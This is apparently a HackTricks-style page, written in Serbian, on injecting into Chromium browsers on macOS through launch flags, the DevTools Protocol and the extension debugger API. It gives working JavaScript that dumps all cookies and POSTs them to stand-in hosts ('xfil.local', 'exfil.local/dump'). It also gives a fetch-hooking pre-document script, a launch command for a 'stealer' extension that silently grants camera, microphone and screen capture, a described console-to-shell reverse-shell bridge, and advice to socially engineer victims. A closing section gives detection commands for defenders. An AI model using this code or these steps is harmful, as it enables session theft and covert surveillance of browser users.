# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Browseri zasnovani na Chromium-u, kao što su Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, koriste iste command-line switches, preference fajlove i DevTools automation interfejse. Na macOS-u, svaki korisnik sa GUI pristupom može da prekine postojeću browser sesiju i ponovo je pokrene sa proizvoljnim flagovima, ekstenzijama ili DevTools endpointima koji rade sa entitlements ciljanog korisnika.

#### Pokretanje Chromium-a sa prilagođenim flagovima na macOS-u

macOS održava jednu UI instancu po Chromium profilu, pa instrumentation obično zahteva prisilno zatvaranje browsera (na primer pomoću `osascript -e 'tell application "Google Chrome" to quit'`). Napadači obično ponovo pokreću browser pomoću `open -na "Google Chrome" --args <flags>`, čime mogu da injektuju argumente bez menjanja app bundle-a. Umotavanje te komande u korisnički LaunchAgent (`~/Library/LaunchAgents/*.plist`) ili login hook garantuje da će kompromitovani browser biti ponovo pokrenut nakon reboot-a/logoff-a.

#### `--load-extension` Flag

`--load-extension` flag automatski učitava unpacked ekstenzije (putanje razdvojene zarezima). Kombinujte ga sa `--disable-extensions-except` da biste blokirali legitimne ekstenzije i prisilili pokretanje samo vašeg payload-a. Malicious ekstenzije mogu zahtevati permissions visokog uticaja kao što su `debugger`, `webRequest` i `cookies`, kako bi se prebacile na DevTools protokole, izmenile CSP headere, downgrade-ovale HTTPS ili exfiltrated session materijal čim se browser pokrene.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Ovi switch-evi izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a, tako da eksterni alati mogu da upravljaju browserom. Google je uočio široku zloupotrebu ovog interfejsa od strane infostealer-a i, počev od Chrome 136 (mart 2025), switch-evi se ignorišu za default profil osim ako je browser pokrenut sa nestandardnim `--user-data-dir`. Ovo primenjuje App-Bound Encryption na stvarne profile, ali napadači i dalje mogu da pokrenu svež profil, navedu žrtvu da se autentifikuje unutar njega (phishing/triage assistance) i prikupe cookies, tokene, device trust states ili WebAuthn registracije preko CDP-a.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Ovaj flag preusmerava ceo browser profil (History, Cookies, Login Data, Preference fajlovi itd.) na putanju pod kontrolom napadača. Obavezan je pri kombinovanju modernih Chrome build-ova sa `--remote-debugging-port`, a takođe održava kompromitovani profil izolovanim, tako da možete da ubacite unapred popunjene `Preferences` ili `Secure Preferences` fajlove koji onemogućavaju security prompt-e, automatski instaliraju ekstenzije i menjaju podrazumevane scheme-ove.

#### `--use-fake-ui-for-media-stream` Flag

Ovaj switch zaobilazi prompt za dozvolu pristupa kameri/mikrofonu, tako da svaka stranica koja pozove `getUserMedia` odmah dobija pristup. Kombinujte ga sa flagovima kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ili CDP `Browser.grantPermissions` komandama da biste nečujno snimali audio/video, delili desktop ili zadovoljili WebRTC permission provere bez interakcije korisnika.

## Obrasci isporuke i ponovnog pokretanja uočenih napada

CDP abuse je obično **post-exploitation** faza, a ne početni payload. Nedavna macOS kampanja usmerena na developere koristila je zatrovanu Xcode **`Run Script` build fazu** (`PBXShellScriptBuildPhase`), tako da se kod izvršavao samo kada bi žrtva **build-ovala** projekat, a ne kada bi ga samo klonirala ili otvorila. Nakon tog prvog izvršavanja, malware je takođe zarazio druga `.xcodeproj` stabla, dodao malicious Git `pre-commit` hook-ove i pretraživao ZIP arhive u potrazi za dodatnim Xcode projektima.<sup>[[3]](#references)</sup>

Za Chromium abuse ovo je važno zato što napadač ne mora da menja sam browser binary. Kratkotrajni build-phase / `osascript` stager umesto toga može da instalira **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher itd.) koji ponovo otvara legitimni browser sa flagovima pod kontrolom napadača svaki put kada ga korisnik pokrene.<sup>[[3]](#references)</sup>

> [!TIP]
> Na developer endpoint-ima proverite `.pbxproj` fajlove, `.git/hooks/pre-commit` i ZIP-ove koji sadrže `.xcodeproj`, u potrazi za neočekivanim `curl`, `osascript`, `xxd`, ugnježdenim `base64` ili logikom za ponovno pokretanje Chrome-a.

## Remote Debugging i DevTools Protocol Abuse

Kada se Chrome ponovo pokrene sa namenskim `--user-data-dir` i `--remote-debugging-port`, možete da se povežete preko CDP-a (na primer pomoću `chrome-remote-interface`, `puppeteer` ili `playwright`) i skriptujete workflow-e sa visokim privilegijama:

- **Krađa cookie-ja/sesije:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption inače blokirao pristup fajl sistemu, zato što CDP traži od pokrenutog browsera da ih dekriptuje.
- **Manipulacija permission-ima:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje prompt-ova za kameru/mikrofon (naročito u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje security provera zasnovanih na lokaciji.
- **Keystroke/script injection:** `Runtime.evaluate` izvršava proizvoljan JavaScript unutar aktivnog taba, omogućavajući krađu credential-a, izmenu DOM-a ili injektovanje persistence beacon-a koji preživljavaju navigaciju.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću authenticated request-ove/response-ove u realnom vremenu bez dodirivanja artefakata na disku.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje postojećeg direktorijuma `~/Library/Application Support/Google/Chrome` žrtve na staging putanju više ne omogućava dobijanje dešifrovanih kolačića. Umesto toga, socijalnim inženjeringom navedite korisnika da se autentifikuje unutar instrumentisanog profila (npr. „korisna“ support sesija) ili presretnite MFA tokene u tranzitu pomoću CDP-kontrolisanih network hook-ova.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Praktičan obrazac malware-a je:

1. Ponovo pokrenuti userland implant ili wrapper svaki put kada se Chrome pokrene.
2. Pokrenuti legitimni browser sa `--remote-debugging-port=<port>` i, na Chrome 136+, obično sa uparenim nestandardnim `--user-data-dir=<dir>`.
3. Pokrenuti helper koji se povezuje na lokalni CDP WebSocket i registruje pre-document hook pomoću `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Taj helper može da injectuje JavaScript **pre** nego što se kôd sajta pokrene, što je idealno za hook-ovanje `window.fetch`, `XMLHttpRequest`, wallet providers ili autofill tokova bez izmene fajlova na disku.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Jača varijanta pretvara browser u **host command bridge**: injected JavaScript emituje `console.log` sa delimiter markerom, lokalni helper prati `Runtime.consoleAPICalled`, uklanja marker, izvršava ostatak kroz host shell (na primer, Go-ov `exec.Command`) i vraća stdout/stderr preko napadačevog WebSocket-a. Ovo nadograđuje izvršavanje skripti na nivou taba u uglavnom fileless reverse shell.<sup>[[3]](#references)</sup>

## Injection zasnovan na Extension-u putem Debugger API-ja

Istraživanje „Chrowned by an Extension“ iz 2023. godine pokazalo je da malicious extension koji koristi `chrome.debugger` API može da se zakači na bilo koji tab i dobije iste DevTools privilegije kao `--remote-debugging-port`.<sup>[[6]](#references)</sup> To narušava prvobitne pretpostavke o izolaciji (extensions ostaju u svom kontekstu) i omogućava:

- Nečujnu krađu cookie-ja i credential-a pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
- Izmenu site permissions (kamera, mikrofon, geolokacija) i zaobilaženje security interstitial-a, čime phishing stranice mogu da oponašaju Chrome dijaloge.
- Tampering TLS upozorenja, download-a ili WebAuthn prompt-ova kroz programsko upravljanje pomoću `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ili `Security.handleCertificateError`.

Učitajte extension pomoću `--load-extension`/`--disable-extensions-except`, tako da interakcija korisnika nije potrebna. Minimalni background script koji weaponize-uje API izgleda ovako:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Ekstenzija se takođe može pretplatiti na događaje `Debugger.paused` kako bi čitala JavaScript promenljive, menjala inline skripte ili postavljala prilagođene tačke prekida koje opstaju nakon navigacije. Pošto se sve izvršava unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već ostvario izvršavanje u kontekstu korisnika.<sup>[[6]](#references)</sup>

## Detekcija i Hunting

- Upozorite na Chromium browsers pokrenute sa `--remote-debugging-port`, `--remote-debugging-pipe` ili sumnjivim `--user-data-dir`, naročito kada je roditeljski proces `bash`, `sh`, `osascript`, `xcodebuild` ili LaunchAgent helper.
- Potražite kratke lance u kojima helper otvara lokalni CDP WebSocket, registruje `Page.addScriptToEvaluateOnNewDocument`, a zatim uspostavlja dugotrajnu odlaznu WebSocket/HTTPS vezu.
- Tražite mostove između konzole i shell-a tako što ćete povezati aktivnost browsera `Runtime.consoleAPICalled` sa child shell procesima ili helper procesima koji izvršavaju komande prosleđene od napadača.
- Na developerskim Mac računarima pregledajte unose `PBXShellScriptBuildPhase` u fajlovima `.pbxproj`, Git `pre-commit` hooks, Dock/login item relaunchers i Xcode projekte sadržane u ZIP arhivama zbog instalacije browser wrappera.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Alati

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanje Chromium-a sa payload ekstenzijama i izlaže interaktivne CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan alat fokusiran na presretanje saobraćaja i instrumentaciju browsera za macOS operatere.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za skriptovanje Chrome DevTools Protocol dumpova (cookies, DOM, permissions) kada je instanca sa `--remote-debugging-port` aktivna.

### Primer
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pronađite još primera u linkovima ka alatima.

## Reference

- [1] [Chrome DevTools Protocol - Runtime domen](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domen](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Xcode Assassin se vraća: detaljna analiza najnovije verzije XCSSET-a - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) na X-u](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Izmene prekidača za remote debugging radi poboljšanja bezbednosti - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: zloupotreba Chrome DevTools Protocol-a putem Debugger API-ja (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
